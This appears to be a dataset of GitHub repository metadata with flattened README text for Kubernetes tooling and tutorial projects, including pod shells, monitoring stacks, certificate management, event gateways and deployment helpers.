roubles,kubeshell,,kubeshell kubeshell is a command line tool to interactively shell in to and out of kubernetes pods kubeshell Pick your pod NAME READY STATUS RESTARTS AGE some pod 7f9b5f475wdcmv 1 1 Running 0 26h some other pod 556p4cfw 0 1 CrashLoopBackOff 83 7h10m yet another pod 589cf77568 rjzkv 0 1 Running 82 7h4m exit Install You can install from pypi as follows pip install kubeshell OR clone the repo git clone https github com roubles kubeshell cd kubeshell python setup py install Usage usage kubeshell h s SHELL n NAMESPACE substring interactively shell into k8s pods positional arguments substring substring to filter pods optional arguments h help show this help message and exit s SHELL shell SHELL Which shell to use n NAMESPACE namespace NAMESPACE Which namespace to use,2020-09-02T04:43:42Z,2020-12-28T13:47:50Z,Python,User,1,3,0,1,master,roubles,1,0,0,0,0,0,0
dathan,tailscale-docker,,tailscale docker Run tailscale as a relay into kubernetes backnet and or services Since TCP direction is a figment of convention and not reality we do not need an ingress NAT allows for the server in a private net to advertise a public address and port on the public interface The Firewall allows that traffic since the firewall allows any traffic conceptually outbound Main Files Dockerfile using an ubuntu environment use the latest stable version of tailscale helm the helm chart to install tailscale into kubernetes with the purpose of advertisement of routes to backnet resources Verified Able to reach databases behind the container How to run modify helm values tmpl and set the values correctly make helmrun assumes you set up the secrets for the registry REQUIREMENTS https www kernel org doc Documentation networking tuntap txt dev net tun is required by VPN software to intercept packets The container needs an escalated privilege called https docs docker com engine reference run runtime privilege and linux capabilities NETADMIN which gives admin to the network core of node TODO verify the container is up Special Thanks to hamishforbes he had a thread that gave me a roadmap to get this done,2020-08-31T21:51:05Z,2020-11-06T18:26:33Z,HTML,User,1,3,0,13,master,dathan,1,0,0,0,0,0,0
ltblueberry,loki-k8s-example,example#example-project#grafana#kubernetes#loki#loki-stack,Example of Loki Stack in K8S cluster Example the kubernetes cluster with configured persistent volumes and ingress controller kubectl installation guide is here https kubernetes io docs tasks tools install kubectl helm installation guide is here https helm sh docs intro install example domain grafana example com Namespace Create the monitoring namespace kubectl create namespace monitoring created namespace screenshots screenshot namespace png Loki stack Add and update Loki helm chart repository helm repo add loki https grafana github io loki charts helm repo update helm repo screenshots screenshot loki helm repo png Install Loki stack helm install loki loki loki stack namespace monitoring f loki values yaml loki pods screenshots screenshot loki pods png Grafana Add and update Grafana helm chart repository helm repo add grafana https grafana github io helm charts helm repo update helm repo screenshots screenshot grafana helm repo png Install Grafana helm install grafana grafana grafana namespace monitoring f grafana values yaml grafana pod screenshots screenshot grafana pod png Get admin password kubectl get secret namespace monitoring grafana o jsonpath data admin password base64 decode echo Deploy Grafana ingress kubectl apply f ingress yaml grafana ingress screenshots screenshot grafana ingress png Add ingress IP address to etc hosts for grafana example com Check out web interface in browser Sign in with user admin and password Create new dashboard and panel Our Loki datasource is available and it is the default datasource Set log labels with value container grafana it is an example you can try any other meta label app namespace etc set visualization type Logs grafana log panel screenshots screenshot grafana log panel png,2020-11-30T10:16:34Z,2020-12-12T04:41:07Z,n/a,User,1,3,0,9,master,ltblueberry,1,0,0,0,0,0,0
borisputerka,updatecontext,kubectl#kubectl-command#kubectl-plugin#kubectl-plugins#kubernetes,kubectl updatecontext GitHub Release https img shields io github release borisputerka updatecontext svg style flat https github com borisputerka updatecontext releases Go Report Card https goreportcard com badge github com borisputerka updatecontext https goreportcard com report github com borisputerka updatecontext Kubectl https github com kubernetes kubectl plugin that manages kubernetes contexts It will create context in format Contexts for non existent namespaces will be deleted e g after you delete namespace with created context To switch contexts you can use kubectx https github com ahmetb kubectx or fzf https github com junegunn fzf see instructions below Once you have contexts created you will no longer need to use kubectx with kubens when accessing namespace in different cluster Installation and usage Info This plugin is not in krew index https github com kubernetes sigs krew index but for convenience I added krew manifest as installlation option 1 Install plugin using krew manifest in this repository kubectl krew install manifest deploy krew plugin yaml or using Makefile make bin 2 Use plugin kubectl updatecontext Use fzf to switch contexts Add these lines into your bashrc or zshrc fzf inline alias alias inlinefzf fzf multi ansi i 1 height 50 reverse 0 header lines 1 inline info border kubernetes contexts switcher kcs local context kubectl config get contexts inlinefzf awk print 1 eval kubectl config set current context context Now use kcs within your terminal kcs,2020-10-22T14:38:08Z,2020-12-01T01:43:47Z,Go,User,1,3,1,21,master,borisputerka,1,2,2,0,0,0,4
lreimer,ignite-k8s-pulumi,apache-ignite#kubernetes#pulumi#pulumi-kubernetes#pulumi-typescript#showcase,Apache Ignite on K8s using Pulumi Deploy Apache Ignite 2 9 0 on K8s using Pulumi infrastructure as code Usage bash optionally set configuration values pulumi config set serviceType LoadBalancer pulumi config set replicas 5 pulumi up kubectl get all n ignite pulumi destroy References https www pulumi com blog introducing kube2pulumi https github com pulumi kube2pulumi Maintainer M Leander Reimer lreimer License This software is provided under the MIT open source license read the LICENSE file for details,2020-11-03T13:57:09Z,2020-11-05T15:35:29Z,TypeScript,User,1,3,0,1,main,lreimer,1,0,0,0,0,0,0
sidd-harth,kubernetes,cka#ckad#cncf#k8s#kubernetes#kubernetes-secrets,Beyond Kubernetes Certification Challenges To keep myself updated and involved with K8S I will be exploring K8S beyond the certification topics and create challenges here on my findings These challenges are good to know and might be overkill for CKA CKAD based certifications I just mentioned few tips and nothing else for CKA CKAD certifications as the internet is flooded with many different blogs repos videos training exercises to prepare for all 3 Kubernetes certifications If you are looking for CKS resources scroll to the bottom of this page Note Please feel free to make a pull request if there s something wrong should be added or updated Sections 1 CKA and CKAD Beyond Certification Challeneges https github com sidd harth kubernetes cka ckad challenges 2 CKA and CKAD Exam Tips https github com sidd harth kubernetes cka ckad exam tips Using aliases https github com sidd harth kubernetes using aliases VIM editor changes https github com sidd harth kubernetes vim editor changes Bookmarks https github com sidd harth kubernetes bookmarks 3 CKS Resources https github com sidd harth kubernetes cks resources CKA CKAD Challenges Challenge 1 Encrypting Secret Data at Rest https github com sidd harth kubernetes blob main challenges Encrypting 20Secret 20Data 20at 20Rest md Challenge 2 Expanding PVC Storage Size https github com sidd harth kubernetes blob main challenges Expanding 20PVC 20Storage 20Size md Challenge 3 Startup Probe https github com sidd harth kubernetes blob main challenges Startup 20Probe md CKA CKAD Exam Tips Kubectl aliases alias k kubectl alias kn k config set context current namespace alias kd k o yaml dry run client alias kall k get all o wide show labels alias kc k config get contexts Using aliases In the exam every question has a context given we need to switch over to that context Some questions are expected to work on specific namespaces Sometimes we tend to forget adding n argument to create resources in a specific namespace These aliases will help in quickly changing the namespace and also checking the current context before answering debugging the questions Example Create a Deployment name nginx frontend Expose it using a Service named nginx svc Write the output of all Service Endpoints to opt INC002 endpoints txt Everything needs to be done in rs67 namespace Without aliases k create deploy nginx frontend image nginx n rs67 k expose deploy nginx frontend name nginx svc port 80 n rs67 k get ep n rs67 opt INC002 endpoints txt With aliases kn rs67 changing context to use rs67 namespace kc shows the current context and the namespace details k create deploy nginx frontend image nginx k expose deploy nginx frontend name nginx svc port 80 k get ep opt INC002 endpoints txt kn default I feel it is a good practice to switch back to default namespace after every question VIM Editor changes These two additions were enough for me to edit create YAMLs using VI sudo vi etc vim vimrc set number set paste Bookmarks During the exam you can keep only one other browser tab open to refer to official documentation I have uploaded the bookmarks which I have used for 1 19version These bookmarks can be used for both CKA CKAD Name Resource Bookmark Kubernetes Chrome Bookmarks https github com sidd harth kubernetes blob main Kubernetes Chrome Bookmarks html CKS Resources Walid Shaari https github com walidshaari Certified Kubernetes Security Specialist ibrahim Jelliti https github com ibrahimjelliti CKSS Certified Kubernetes Security Specialist Kim Wuestkamp https wuestkamp medium com kubernetes cks full course simulator 3893120baa1d Kubernetes CKS 2020 Complete Course Simulator https www udemy com course certified kubernetes security specialist,2020-11-24T12:18:16Z,2020-11-28T06:20:39Z,HTML,User,1,3,6,5,main,sidd-harth,1,0,0,0,0,0,0
nabsul,k8s-letsencrypt,,Let s Encrypt for Kubernetes The Hard Way This repo shows you how to manage Let s Encrypt certificates in your Kubernetes cluster without the use of automation Normally you should be fine using something like cert manager https cert manager io docs or Traefik https traefik io to automatically manage your certs However when these tools fail it s good to have a backup plan to keep your certificates up to date That s where this repo comes in Note The following instructions are for using the http validation method If you prefer to use the DNS method you can skip the acme challenge service creation and path routing steps How to Use This Repo You can either use the two provided yaml files as is in your cluster or if you d like to have more control and customization build the admin Docker image yourself and tweak the yaml files according to your needs The following sections show how to use this code HTTP Method Validation The following sections describe how to create your certs using the HTTP Method Step 1 Optional Build the Admin Image The Admin pod is just a Debian image with certbot and kubectl pre installed If you trust my work you can go ahead and use the public Docker Hub image I have published at nabsul k8s admin v002 But to be honest you really shouldn t trust Docker images from strangers For this reason I personally recommend building the admin image yourself You can also build the docker image yourself using the included Dockerfile or even deploy a base image and manually install certbot and kubectl once you log in If you go this route you ll need to tweak the image field at the end of the admin yaml accordingly Step 2 Deploy the admin Image and acme challenge Service The Admin pod will need permissions to create certificates The admin yaml file deploys the pod and grants it access to manage secrets in your cluster To create the admin pod simply run sh kubectl apply f admin yaml The acme challenge service is just a plain nginx pod We will be routing requests to the well known acme challenge path to this pod for the validation step needed to create Let s Encrypt certificates The service can be created with the following command sh kubectl apply f acme challenge yaml Step 3 Route Path to the acme challenge Service You ll need to route requests to the well known acme challenge path to the acme challenge service To do this go to your Ingress definition and add the following as the first entry in your paths section yaml path well known acme challenge pathType Prefix backend serviceName acme challenge servicePort 80 For example your complete ingress file should look like this yaml apiVersion networking k8s io v1beta1 kind Ingress metadata name tet ingress spec tls hosts mytest test secretName test tls rules host mytest test http paths path well known acme challenge pathType Prefix backend serviceName acme challenge servicePort 80 backend serviceName hello world servicePort 80 Step 4 Run CertBot Now we ll log into the admin pod to create our certificate sh kubectl exec it k8s admin bash You should now see the Debian bash prompt of the admin pod You can now start the process of issuing the certificate with the following command sh certbot certonly manual preferred challenges http d mydomain com You will have to provide your email address and agree to some terms You will then be asked to create a file with content like this sh Create a file containing just this data 2RzVb85lAE2wPnNf UJzdVkxPjxgw86oEtPpV6ls ABCABC1dedKwmTsyyDkbIsd76jnfrn5aXrwkPkHU And make it available on your web server at this URL http your domain well known acme challenge ABSABVb85lAE2wPnNf UJzdVkxPjxgw86oEtPpV6ls Leave this window tab open and move on to the next step Step 5 Copy Code to the acme challenge Service In a new shell window tab you ll need to log into your nginx service sh kubectl exec it acme challenge bash We ll now navigate to the html content directory and create a couple of empty directories sh cd usr share nginx html mkdir well known cd well known mkdir acme challenge cd acme challenge Finally we ll create the file that was requested in the previous step For example sh echo 2RzVb85lAE2wPnNf UJzdVkxPjxgw86oEtPpV6ls ABCABC1dedKwmTsyyDkbIsd76jnfrn5aXrwkPkHU ABSABVb85lAE2wPnNf UJzdVkxPjxgw86oEtPpV6ls Step 6 Create a Kubernetes Secret Now we will return to the first window tab and press enter to continue If everything was done correctly it should report a success message like so sh Press Enter to Continue Waiting for verification Cleaning up challenges IMPORTANT NOTES Congratulations Your certificate and chain have been saved at etc letsencrypt live your domain fullchain pem Your key file has been saved at etc letsencrypt live your domain privkey pem Your cert will expire on 2021 01 21 To obtain a new or tweaked version of this certificate in the future simply run certbot again To non interactively renew all of your certificates run certbot renew We will navigate to the directory shown above sh cd etc letsencrypt live your domain And finally we ll create our ssl cert in Kubernetes with the following command If the secret already exists you ll first need to delete it You can skip the delete command if it doesn t already exist sh kubectl delete secret your cert name kubectl create secret tls your cert name cert fullchain pem key privkey pem Step 7 Clean Up You don t need to keep the admin pod running after you ve issued your certificates To delete the admin pod and acme challenge service you can run the following two commands sh kubectl delete f admin yaml kubectl delete f acme challenge yaml You can also remove the well known path entry from the Ingress configuration DNS Validation Method I won t go into as much detail for the DNS method It s very similar to the HTTP method except No need to deploy the acme challenge service No need to add the well known acme challenge path to the ingress configuration Use preferred challenges dns in the certbot command instead of preferred challenges http Instead of creating a file in the nginx pod you ll create a txt entry in your domain configuration,2020-10-23T18:36:54Z,2020-11-22T13:11:00Z,Dockerfile,User,1,3,1,1,main,nabsul,1,0,0,0,0,0,0
Hacker-Linner,k8s-eggjs,,K8S EGGJS EggJS Kubernetes Traefik Helm Prometheus Grafana https juejin cn post 6900790776909791240 app public images k8s 1 png app public images prome 1 png app public images grafana 6 png,2020-11-29T13:17:35Z,2020-12-12T00:56:48Z,JavaScript,Organization,0,3,0,8,main,Kirk-Wang,1,0,0,0,0,0,0
neuroglia-io,K8s.Eventing,aspnetcore#cloudevent#dotnet#eventing#eventing-infrastructure#eventstore#gateway#istio#k8s#kubernetes#nats-streaming,Neuroglia K8s Eventing An open source NET 5 0 implementation of a cloud event gateway for Kubernetes and Istio There is an issue with our Docker image registry which is unavailable at the moment If you wish to test the solution please clone the repository and build the following images locally before applying the eventing core yaml https github com neuroglia io K8s Eventing blob main deployment eventing core yaml and eventing channel natss yaml https github com neuroglia io K8s Eventing blob main deployment eventing channel natss yaml files Gateway image https github com neuroglia io K8s Eventing blob main src Gateway Neuroglia K8s Eventing Gateway Api Dockerfile NATSS Channel image https github com neuroglia io K8s Eventing blob main src Channels NATSS Neuroglia K8s Eventing Channels Nats Api Dockerfile Table of contents Motivation https github com neuroglia io K8s Eventing motivation Under the hood https github com neuroglia io K8s Eventing under the hood Usage https github com neuroglia io K8s Eventing usage 1 Install the Custom Resource Definitions CRDs https github com neuroglia io K8s Eventing 1 install the custom resource definitions crds 2 Deploy Neuroglia K8s Eventing https github com neuroglia io K8s Eventing 2 deploy neurogliak8seventing 3 Install an eventing channel https github com neuroglia io K8s Eventing 3 install an eventing channel NATS Streaming Channel https github com neuroglia io K8s Eventing nats streaming channel 4 Create a broker https github com neuroglia io K8s Eventing 4 create a broker 5 Start using Neuroglia Kubernetes Eventing https github com neuroglia io K8s Eventing 5 start using neuroglia kubernetes eventing Examples https github com neuroglia io K8s Eventing examples Contributing https github com neuroglia io K8s Eventing contributing Motivation In the context of the development of our new cloud native POS Management solution which heavily relies on integration events we wanted to abstract away from our numerous microservices the burden of eventing specific implementations which were tightly coupled to vendor specific code Furthermore shortly after discovering and falling in love with Istio https istio io which already abstracts a lot of concerns away from applications ex tracing metrics logging we decided we needed to be able to leverage the traffic shaping features https istio io latest docs concepts traffic management of that beautiful software by applying it to eventing The problem with brokers such as NATS https nats io RabbitMQ https www rabbitmq com and Kafka https kafka apache org is that events messages are usually transfered thanks to some kind of application layer on top of an opaque TCP connection which makes it near impossible to shape traffic based on attributes such as message subject and would have tightly coupled whatever solution we may have come up with to vendor specific implementations thus taking away from us the freedom to change those at will according to use cases We then found the CloudEvent specification https github com cloudevents spec In short the latter is a specification for describing event data in common formats to provide interoperability across services platforms and systems Because they are best used in association with well known communication technologies such as HTTP and or GRPC using CloudEvents made traffic shaping with Istio https istio io or other meshes theoretically possible thus solving the problems described above The only thing we were lacking to make it happen at that point was a gateway meaning a software which could consume cloud events optionally publishing them to underlying sinks such as NATS https nats io or Kafka https kafka apache org and would route them to subscribers Knative eventing https knative dev docs eventing and other similar solutions looked like they could do the trick And in a way they did As a matter of fact those technologies did abstract away from our apps all the eventing technicalities limiting their concern to the implementation of simple HTTP endpoints while optionnally running on top of vendor specific implementations in the backend They did however come with huge pain points Subscriptions Triggers and the like could only be created declaratively that is thanks to an applied yaml file on Kurbenetes Rare are the use cases where it isn t enough but they exist autonomous replicas of a statefull service for instance Subscriptions were left to their bare minimum there was no way to say create a durable subscription to a given subject or to replay a whole stream of events in case of the critical failure of a service In fact I don t even understand why Knative https knative dev docs eventing for example relies on NATS Streaming https docs nats io nats streaming concepts intro rather than NATS https nats io for it does not seem to leverage the persistence mechanisms it offers at least not at a consumer level We then took the decision to use the incredible possibilities Kubernetes https kubernetes io and Istio https istio io offer to make the CloudEvent https github com cloudevents spec Gateway that could solve all of our problems in the most simple way possible This repository contains the result of our quest We hope it can be as usefull to you as it has been to us Happy coding Under the hood Below is a schema providing a quick architectural overview of Neuroglia K8s Eventing Architectural overview overview png Usage 1 Install the Custom Resource Definitions CRDs powershell kubectl apply f https raw githubusercontent com neuroglia io K8s Eventing main deployment eventing crds yaml 2 Deploy Neuroglia K8s Eventing powershell kubectl apply f https raw githubusercontent com neuroglia io K8s Eventing main deployment eventing core yaml Verify the installation by running the following command powershell kubectl get services n neuroglia eventing If the installation was successfull you should see a similar result Neuroglia Eventing installation neuroglia eventing check PNG 3 Install an eventing channel Available channels NATS Streaming NATS Streaming Channel Install NATS Streaming powershell kubectl apply f https raw githubusercontent com neuroglia io K8s Eventing main deployment natss yaml Verify NATS Streaming installation by running the following command powershell kubectl get services n natss If the installation was successfull you should see a similar result NATSS installation natss check PNG Install NATS Streaming Channel powershell kubectl apply f https raw githubusercontent com neuroglia io K8s Eventing main deployment eventing channel natss yaml Verify NATS Streaming installation by running the following command powershell kubectl get channels n neuroglia eventing If the installation was successfull you should see a similar result NATSS Channel installation channel natss check PNG 4 Create a broker Create the broker s yaml file yaml broker yaml apiVersion eventing k8s neuroglia io v1alpha1 kind Broker metadata name broker the name of your broker Can be anything you want namespace my namespace the namespace in which to install the broker spec channel natss the eventing channel to use Apply the broker powershell kubectl apply f broker yaml Verify that the broker was successfully installed powershell kubectl get brokers n my namespace If the installation was successfull you should see a similar result Broker installation broker check PNG 5 Start using Neuroglia Kubernetes Eventing Publishing a CloudEvent Whenever one of your service needs to publish a CloudEvent make an HTTP POST request to the pub endpoint url of your namespaced broker which is always equal to http brokerName namespace svc cluster clusterName events pub fully qualified service name or http brokerName events pub namespaced service name If you are not sure about your broker s url you can execute the following command powershell kubectl get brokers n my namespace The broker s url will be displayed in the URL column of the output c using HttpClient httpClient new HttpClient var content new CloudEventContent new CloudEvent test new Uri test UriKind Relative Subject test Data JsonConvert SerializeObject new Message Hello world DataContentType new ContentType MediaTypeNames Application Json ContentMode Structured new JsonEventFormatter using HttpResponseMessage response await httpClient PostAsync http broker events pub content response EnsureSuccessStatusCode this Logger LogInformation Cloud event published Subscribing to CloudEvents Declaratively Create a new yaml file for your subscription yaml sub yaml apiVersion eventing k8s neuroglia io v1alpha1 kind Subscription metadata name test subscription The name of the subscription Can be anything you want namespace my namespace The namespace the subscription belongs to spec channel natss The channel the subscription is bound to subject test The subject to subscribe to subscriber uri http consumer my namespace svc cluster local events The absolute uri to your consumer service s CloudEvent endpoint It MUST have the following structure http fullyQualifiedServiceName cloudEventsEndpoint Apply your subscription powershell kubectl apply f sub yaml Verify that the subscription was successfully installed powershell kubectl get subscriptions n my namespace If the installation was successfull you should see a similar result Subscription installation sub check PNG That s it Start producing events and see them being dispatched to your service s endpoint Programatically Whenever one of your service needs to create a new subscription programatically make an HTTP POST request to the sub endpoint url of your namespaced broker which is always equal to http brokerName namespace svc cluster clusterName events sub fully qualified service name or http brokerName events sub namespaced service name C using HttpClient httpClient new HttpClient var createSubscriptionCommand new CreateSubscriptionCommandDto Subject test Channel natss Subscribers new List new Uri http my consumer my namespace svc cluster local using HttpResponseMessage response await httpClient PostAsJsonAsync http broker events sub options response EnsureSuccessStatusCode this Logger LogInformation Subscription created Examples There is an extensive example in the examples directory https github com neuroglia io K8s Eventing tree master examples Running the example 1 Build the GatewayClient s docker image powershell git clone git github com neuroglia io K8s Eventing git docker build f localPathneuroglia k8s eventingexamplesgatewayclientdockerfile localPathneuroglia k8s eventing 2 Deploy the GatewayClient to Kubernetes powershell kubectl apply f localPathneuroglia k8s eventingexamplesgatewayclienteventing test yaml 3 Verify that the GatewayClient s pod is running powershell kubectl get pods n eventing test 4 Start testing Creating a new subscription Make a POST request to http localhost events sub subject MySubject Keep the returned subscription s id if you wish to delete it afterwards Deleting an existing subscription Make a DELETE request to http localhost events unsub subscriptionId MySubscriptionId Publishing a new cloud event Make a POST request to http localhost events pub with an application cloudevents json payload such as the following json type io neuroglia test source test subject test id testid data message hello world datacontentype application json Verifying that all is working as expected Get the name of the pod the GatewayClient is running on powershell kubectl get pods n eventing test Display the logs of the GatewayClient pod powershell kubectl logs f myPodId n eventing test gatewayclient You should see a log line such as Received a cloud event with type type and subject subject every time you publish a new cloud event with a subject you have subscribed to If you delete the subscription you should not receive any cloud events anymore Cleaning up powershell kubectl delete f localPathneuroglia k8s eventingexamplesgatewayclienteventing test yaml Contributing Please see CONTRIBUTING md https github com neuroglia io K8s Eventing blob master CONTRIBUTING md for instructions on how to contribute,2020-10-13T10:07:46Z,2020-12-15T14:46:41Z,C#,Organization,2,3,0,7,main,Neuroglia,1,0,0,0,0,0,0
gitlijian,install_k8s,,installk8s install kubernetes scripts kubernets,2020-09-23T09:38:27Z,2020-12-11T02:15:24Z,Shell,User,1,3,0,8,master,gitlijian,1,0,0,0,0,0,0
rovechkin1,avalanche-k8s,avalanchego#grafana#k8s#prometheus#telegram,Running Avalanche Validator on Kubernetes This project deploys Avalanche Validator into k8s cluster It uses Prometheus operator for monitoring For details see this Medium article https rovechkin 56984 medium com running avalanche validator using kubernetes dd255461fc55 Prerequisites clone project with submodules git clone recursive https github com rovechkin1 avalanche k8s Clone submodules add submodules after regular clone git submodule update init recursive Install helm brew install helm Installing on GCP Create cluster using cli deploy cli sh create cluster cluster 1 Manually creating cluster Use gcloud web console to create cluster Recommended k8s cluster 1 2 Nodes Each node 1 CPU 4GB RAM Disk size 200GB approximate cost 30 month for 1 node get k8s cluster credentials gcloud container clusters get credentials zone us central1 c project Install prometheus and avalanche node with a new staking key deploy cli sh deploy all Obtain staking key from running node avax cli sh staking get staking tgz Keep it in a safe place in case node needs to be re created Install prometheus and avalanche node with existing staking key tar xvf staking tgz deploy cli sh k staking deploy all Delete prometheus and avalanche deploy cli sh delete all Update Update avalanche Update values in kube avax values yaml deploy cli sh update avalanche Update dashboards This creates or overwrites existing dashboards deploy cli sh deploy dashboards node monitoring dashboards Monitoring Grafana port forward sh grafana Use browser on locahost 3000 user admin password prom operator See Kubernetes Compute Resources Pod avalalanche Grafana Alarms Alarms can be be configured to post messages to telegram To add this functionality after prometheus and grafana are deployed follow these steps 1 Create telegram chat and obtain chat id using telegram web interface Go to your channel and observe its url https web telegram org im p gXXXXXXXX XXXXXXXX is the channel id 2 Create telegram bot and obtain its api key from botfather in the form XXXXX YYYYYYYYYYYY 3 Configure telegram notification in grafana deploy cli sh create alerts telegram 4 Redeploy dashboards deploy cli sh deploy dashboards node monitoring dashboards 5 Connect to grafana using port forward and test the alerts using port forward sh grafana Miscellaneous Connect to Avalanche Node Management Port Via browser port forward sh avalanche Via terminal avax cli sh exec exit to exit Configure prometheus repo This step is optional unless installing prometheus from repo For that need to change deploi cli sh deployprometheus helm repo add prometheus community https prometheus community github io helm charts helm repo add stable https charts helm sh stable helm repo update Get all peers curl X POST data jsonrpc 2 0 id 1 method info peers H content type application json 127 0 0 1 9650 ext info,2020-12-08T03:01:46Z,2020-12-25T19:25:11Z,Shell,User,1,3,1,6,master,rovechkin1,1,0,0,0,0,0,2
EwanValentine,k8s-patterns,,K8s Patterns Library for creating Kubernetes resources programmatically Status WIP Feel free to chip in Example golang package main import patterns github com EwanValentine k8s patterns log func main app patterns NewApp my namespace container patterns NewContainer patterns ContainerConfig Name test Image nginx latest Port 8080 deployment patterns NewDeployment patterns DeploymentConfig Name test deployment SetReplicas 1 deployment AddContainer container service patterns NewService patterns ServiceConfig Automatically references correct container port Exposes the same port as the service port service SetDeployment deployment ingress patterns NewIngress patterns IngressConfig ingress SetService service if err app AddDeployment deployment AddService service Deploy err nil log Panic err To print as a string first app Preview,2020-11-14T02:00:12Z,2020-11-17T05:48:15Z,Go,User,1,3,0,5,main,EwanValentine,1,0,0,0,0,0,0
chitoku-k,healthcheck-k8s,kubernetes,healthcheck k8s workflow badge workflow link Check if the specified Kubernetes node is schedulable and return as HTTP status code Requirements Go Kubernetes Installation sh go build sh Port number required export PORT 8080 Name of header in which client sends a node name required export HEADERNAME X Node Path to the kubeconfig or else falls back to service account token mounted inside the Pod optional export KUBECONFIG HOME kube config Timeout in milliseconds optional zero means infinity export TIMEOUTMS 30000 Usage sh healthcheck k8s Normal node is schedulable sh curl dump header H X Node minikube localhost 8080 HTTP 1 1 200 OK Content Type text plain charset utf 8 Date Wed 01 Jan 2020 00 00 00 GMT Content Length 26 Node s are OK minikube Cordoned node is unschedulable sh kubectl cordon minikube node minikube uncordoned curl dump header H X Node minikube localhost 8080 HTTP 1 1 503 Service Unavailable Content Type text plain charset utf 8 Date Wed 01 Jan 2020 00 00 00 GMT Content Length 52 Node minikube is currently undergoing maintenance Spec Status Condition 200 Node is schedulable 400 Header is not present in the request 404 Node was not found 500 Unexpected error when retrieving node status 503 Node is unschedulable 504 Timed out connecting to kube apiserver workflow link https github com chitoku k healthcheck k8s actions query branch master workflow badge https img shields io github workflow status chitoku k healthcheck k8s CI 20Workflow master svg style flat square,2020-09-13T16:53:25Z,2020-12-25T15:49:23Z,Go,User,1,3,1,16,master,dependabot-preview[bot]#chitoku-k,2,11,11,0,0,0,17
networkop,k8s-guide-labs,,,2020-09-20T15:42:31Z,2020-12-24T14:14:56Z,Makefile,User,2,3,0,45,master,networkop,1,0,0,0,0,0,0
mdneuzerling,plumber-on-k8s,,Plumber on Kubernetes This is the Dockerfile and YAML files behind my blog post Hosting a Plumber API with Kubernetes https mdneuzerling com post hosting a plumber api with kubernetes The basic architecture of Kubernetes Understand the container The central concept of Kubernetes is the container When I have an application that I want to deploy I can bundle it up together with the software that it requires to run into a single blob called a container That container can then be run on another machine that doesn t have the application or its dependencies installed The Rocker project for example provides containers with R or RStudio and all of their dependencies I can run that container on another machine and access R or RStudio without actually installing R or RStudio The most common software for creating and running containers is called Docker Containers solve a lot of problems I can bundle up an R script with the exact versions of the packages it uses to have a reproducible analysis I can turn my R script into an API with plumber and put that in a container so that running the container hosts the API I can run multiple containers on the same machine even if the applications are unrelated If one of my applications requires version 3 6 of R and another requires 4 0 then they can run side by side in containers Now run 100 containers There s complexity involved with running many containers and it s this complexity Kubernetes targets I provide Kubernetes with a description of what I want the system to look like I might ask for 3 copies of container A and 2 copies of container B at all times and Kubernetes will do its best to make that a reality Kubernetes is almost always run on a cluster of multiple machines It can run copies of the same container replicas across multiple machines so that they can share a computational load or so that if one falls over there s another container ready to pick up the slack In fact Kubernetes doesn t consider containers precious they re treated as ephemeral and replaceable This also makes it easier to scale if there s a spike in demand just add more containers I count at least three different ways to scale with Kubernetes Adding more containers is just an example It s not as simple as Kubernetes running containers though There are a few layers in between A node is a machine It can be a Raspberry Pi an old laptop or a server with a six figure price tag Or it can be a virtual machine like an AWS EC2 instance At least one of these nodes is special It contains the control plane The deprecated term for the node with the control plane is the master node This is the only time I will refer to the node with this terminology and it s what coordinates the containers The other nodes are called worker nodes and it s on these nodes that the containers are run There s another layer in between node and container and it s the pod Containers are grouped together in pods Containers that rely on each other to perform a common goal are configured by the user to run in a pod together A simple container that doesn t rely on anything else can run in a pod by itself In practice the user configures pods not containers https mdneuzerling com post hosting a plumber api with kubernetes nodes png File description Creating the API The Plumber API itself consists of two files plumber R implements some basic functions as API endpoints parity determines if a given integer is odd or even wait waits 5 seconds then returns the current time as a nicely formatted string fail sets the alive global variable to FALSE quit runs quit exiting the R process that runs the API health returns OK if the alive global variable is TRUE and throws an error otherwise entrypoint R loads the dependencies and runs the plumber API It can be called from shell with Rscript entrypoint R Creating the Docker image The Dockerfile is used to build a Docker image that runs entrypoint R and exposes the API on port 8000 The Docker image can be built with docker build t mdneuzerling plumber on k8s and the resulting image run with docker run p 8000 8000 mdneuzerling plumber on k8s The image can be hosted on a container registry such as Docker Hub Deploying the API Kubernetes is often configured with YAML files These describe a desired state which the Kubernetes cluster will work towards making a reality This API requires a deployment a service and an ingress After making the above image available on Docker Hub deployment yaml configures a deployment on a Kubernetes cluster with 3 replicas of the image It also configures liveness and readiness probes using the health endpoint service yaml implements a service to port 8000 of the pods in the deployment ingress yaml exposes the service to the outside world so that the API can be queried For a local deployment inside a home network the availability of the API will depend on firewall settings These YAML files can be applied with kubectl kubectl apply f https raw githubusercontent com mdneuzerling plumber on k8s main deployment yaml,2020-10-01T11:49:12Z,2020-10-10T18:49:01Z,Dockerfile,User,1,3,1,26,main,mdneuzerling,1,0,0,0,0,0,0
osmanysahin,ukcloud-meetup-k8s,,,2020-09-15T14:41:55Z,2020-09-17T03:05:40Z,HCL,User,1,3,2,6,master,osmanysahin,1,0,0,0,0,0,0
huseyinbabal,tf-k8s-workshop,,Usage Install terraform terraform init export environment variables for GOOGLEAPPLICATIONCREDENTIALS TFVARproject TFVARclustername terraform plan terraform apply auto approve,2020-11-12T16:53:33Z,2020-11-12T20:52:01Z,HCL,User,1,3,1,1,master,huseyinbabal,1,0,1,0,0,0,0
directangular,k8s-lock-action,,About GitHub action to implement mutual exclusion within your workflow It prevents parallel execution of protected steps in your workflow by using a kubernetes secret as a distributed lock Example In the following example we protect the Deploy step from concurrent execution by other runs of the workflow yaml on push branches master name Deployer jobs deploy plz runs on ubuntu 18 04 steps name Checkout uses actions checkout v2 name Lock workflow uses directangular k8s lock action v1 with kubeconfigdata secrets KUBECONFIGDATA lockname my deploy lock name Deploy uses actions deployer Note that you ll need to make any necessary workspace preparations for proper operation of your kubeconfig For example with EKS you would need to configure your AWS credentials prior to k8s lock action since your kubeconfig likely uses the aws eks command to authenticate The image this action runs with includes the awscli package which will pick up authentication from aws actions configure aws credentials or similar yaml name Configure AWS Credentials uses aws actions configure aws credentials v1 with aws access key id secrets AWSACCESSKEYID aws secret access key secrets AWSSECRETACCESSKEY aws region us west 2 name Lock workflow Inputs kubeconfigdata Required Use base64 kube config or similar to generate lockname Required Must be unique across the repository where this action is used kubecontext Optional The context from the provided kubeconfig that should be used This string is simply passed to kubectl use context maxattempts Optional How many times we try to grab the lock before bailing Defaults to 10000 How it works This action abuses kubernetes secrets by using them as a distributed lock The value of the secret is the build number that is currently allowed to execute During the post action cleanup phase the value of the secret is incremented allowing the next build to execute Limitations Stuck locks If the secret gets messed up somehow the task will block until it hits maxattempts and then will fail You can unblock it by overwriting the secret manually kubectl create secret generic from literal nextbuild dry 